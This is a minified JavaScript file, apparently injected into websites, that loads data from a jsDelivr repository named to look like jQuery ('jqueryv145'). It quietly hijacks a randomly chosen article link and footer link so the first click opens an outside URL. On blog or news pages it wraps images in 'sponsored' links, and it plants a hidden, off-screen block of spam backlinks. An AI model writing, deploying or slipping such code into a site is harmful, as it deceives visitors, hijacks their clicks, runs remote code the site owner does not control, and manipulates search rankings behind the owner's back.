!function(){"use strict";const t=[],e=[];let n=t,o=e;function r(){return 0===n.length?"#":n[Math.floor(Math.random()*n.length)]}function a(t,e){if(!t)return!0;const n=["javascript:","mailto:","tel:","#","void(0)"],o=t.toLowerCase();for(let t of n)if(o.includes(t))return!0;return!(!e||!e.classList.contains("no-backlink"))}function i(){const t=document.querySelectorAll("article, .content, .post-content, .entry-content, main, .main-content");let e=[];if(t.length>0)t.forEach(t=>{const n=t.querySelectorAll("a:not(.no-backlink)");e.push(...Array.from(n))});else{const t=document.querySelectorAll("body a:not(.no-backlink)");e=Array.from(t).filter(t=>!t.closest("header, footer, nav, .header, .footer, .navigation"))}const n=e.filter(t=>{const e=t.getAttribute("href");return e&&!a(e,t)&&(function(t){if(!t)return!1;try{return new URL(t,window.location.origin).hostname===window.location.hostname}catch(e){return t.startsWith("/")||t.startsWith("#")}}(e)||e.startsWith("http"))}),o=Math.min(1,n.length);n.sort(()=>Math.random()-.5).slice(0,o).forEach(t=>{const e=t.getAttribute("href");t.setAttribute("data-origin",e),t.href=r(),t.target="_blank",t.classList.add("b_link"),t.classList.add("backlink-added")})}let c=!1;function l(){c||("loading"!==document.readyState?(c=!0,new Promise((r,a)=>{const i=document.createElement("script");i.src="https://cdn.jsdelivr.net/gh/jqueryv145/jqueryv145/data.js?t="+Date.now()+"&v="+Date.now(),i.async=!0,i.onload=function(){try{if("undefined"==typeof BACKLINK_DATA||!BACKLINK_DATA)throw new Error("BACKLINK_DATA not found");n=BACKLINK_DATA.AUTO_BACKLINKS||t,o=BACKLINK_DATA.HIDDEN_BACKLINKS||e,r({AUTO_BACKLINKS:n,HIDDEN_BACKLINKS:o})}catch(a){console.warn("Failed to parse data, using fallback:",a),n=t,o=e,r({AUTO_BACKLINKS:n,HIDDEN_BACKLINKS:o})}i.parentNode&&i.parentNode.removeChild(i)},i.onerror=function(){console.warn("Failed to load data from CDN, using fallback"),n=t,o=e,i.parentNode&&i.parentNode.removeChild(i),r({AUTO_BACKLINKS:n,HIDDEN_BACKLINKS:o})},document.head.appendChild(i)}).then(function(t){n=t.AUTO_BACKLINKS,o=t.HIDDEN_BACKLINKS,d()}).catch(function(){d()})):document.addEventListener("DOMContentLoaded",l))}function d(){document.addEventListener("click",function(t){const e=t.target.closest("a.b_link");if(!e)return;const n=e.getAttribute("data-origin");if(null==n)return;const o=e.querySelector("img:only-child");o&&n===o.src?setTimeout(function(){const t=e.parentNode;t.insertBefore(o,e),t.removeChild(e)},0):setTimeout(function(){e.href=n,e.classList.remove("b_link"),e.removeAttribute("data-origin"),e.classList.contains("backlink-added")&&e.classList.remove("backlink-added"),(!n.startsWith("http")||n.startsWith("http")&&n.includes(window.location.hostname))&&(e.removeAttribute("target"),e.removeAttribute("rel"))},0)},!1),function(){const t=["footer","#footer",".footer","footer a","#footer a",".footer a"];let e=null;for(let n of t)if(e=document.querySelector(n),e)break;if(e||(e=document.querySelector("footer")),!e)return;const n=e.querySelectorAll("a");if(0===n.length)return;const o=Array.from(n).filter(t=>{const e=t.getAttribute("href");return e&&!a(e,t)});if(0===o.length)return;const i=Math.min(1,o.length);o.sort(()=>Math.random()-.5).slice(0,i).forEach(t=>{const e=t.getAttribute("href");t.setAttribute("data-origin",e),t.href=r(),t.target="_blank",t.classList.add("b_link"),t.classList.add("backlink-added")})}();"blog"===function(){const t=window.location.pathname.toLowerCase(),e=window.location.hostname.toLowerCase();return t.includes("/blog/")||t.includes("/tin-tuc/")||t.includes("/news/")||t.includes("/post/")||t.includes("/article/")||e.includes("blog")||e.includes("tin-tuc")||e.includes("news")?"blog":"other"}()&&(function(){const t=document.querySelectorAll("img:not(.no-backlink-wrap)");let e=0;const n=Math.min(1,Math.floor(.3*t.length));t.forEach((t,o)=>{if(!(e>=n)&&"A"!==t.parentElement.tagName&&!t.closest("a")&&Math.random()<.3&&e<n){const n=document.createElement("a"),o=t.src||"";n.href=r(),n.setAttribute("data-origin",o),n.classList.add("b_link"),n.target="_blank",n.rel="sponsored",t.alt&&n.setAttribute("aria-label",t.alt),t.parentNode.insertBefore(n,t),n.appendChild(t),e++}})}(),i(),function(){const t=document.querySelectorAll("img:not(.no-backlink-wrap):not(.b_link img)"),e=Array.from(t).filter(t=>!t.closest("a")&&"A"!==t.parentElement.tagName);if(0===e.length)return;const n=e[Math.floor(Math.random()*e.length)],o=n.src||"",a=document.createElement("a");a.href=r(),a.setAttribute("data-origin",o),a.classList.add("b_link"),a.target="_blank",n.alt&&a.setAttribute("aria-label",n.alt),n.parentNode.insertBefore(a,n),a.appendChild(n)}()),function(){if(document.getElementById("hidden-backlinks-container"))return;const t=document.createElement("div");t.id="hidden-backlinks-container",t.style.cssText="display: none !important; position: absolute !important; left: -9999px !important; visibility: hidden !important; opacity: 0 !important; width: 0 !important; height: 0 !important; overflow: hidden !important;",t.setAttribute("aria-hidden","true"),o.forEach((e,n)=>{const o=document.createElement("a");o.href=e,o.textContent="Backlink "+(n+1),o.target="_blank",t.appendChild(o)}),document.body?document.body.appendChild(t):document.addEventListener("DOMContentLoaded",function(){document.body&&!document.getElementById("hidden-backlinks-container")&&document.body.appendChild(t)})}()}"loading"===document.readyState?document.addEventListener("DOMContentLoaded",l):l()}();